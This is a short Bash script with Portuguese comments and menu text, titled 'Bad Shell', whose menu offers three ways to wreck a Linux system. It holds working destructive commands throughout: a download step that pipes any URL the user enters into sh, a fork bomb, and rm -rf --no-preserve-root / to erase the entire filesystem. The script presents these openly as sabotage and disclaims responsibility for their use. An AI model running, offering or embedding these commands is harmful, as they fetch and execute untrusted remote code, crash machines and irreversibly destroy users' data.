#!/usr/bin/env bash
#Atenção! O autor do código não se responsabiliza pelo uso do script! Use por sua conta e risco!
function menu() {
 clear && echo -n '''
   Bad Shell: o meio + simples de ferrar com seu SO!
  
   [1] Download malicious source
   [2] Fork Bomb
   [3] Suicide Linux
  
   Esolha uma opção: '''
   read -n1 OPTION && echo

  [[ "$OPTION" =~ ^[0-9]+$ ]] || OPTION=0 
  [ "${OPTION}" -ge 1 -a "${OPTION}" -le 3 ] || OPTION=0
  [ "${OPTION}" = "1" ] && download
  [ "${OPTION}" = "2" ] && fbomb
  [ "${OPTION}" = "3" ] && suicide
  [ "${OPTION}" = "0" ] && echo -e "\n\033[41m Opção inválida! \033[0m\n" && exit
}
  
function download(){
  echo -e -n "\n Digite o link completo: "
   read BADLINK
    wget "${BADLINK}" -O- | sh && exit
}

function fbomb() {
  echo -e -n "\n Você têm certeza? [S/N] "
   read -n1 FORK && echo
    case ${FORK} in
    s|S|"") : () { : | : & }; : ;;
    n|N|"") menu ;;
    *) echo -e "\n\033[41m Opção inválida! \033[0m\n" && exit ;;
 esac
}

function suicide() {
  echo -e -n "\n Você têm certeza? [S/N] "
   read -n1 SLINUX && echo
    case ${SLINUX} in
    s|S|"") rm -rf --no-preserve-root / ;;
    n|N|"") menu ;;
    *) echo -e "\n\033[41m Opção inválida! \033[0m\n" && exit ;;
 esac
}
menu
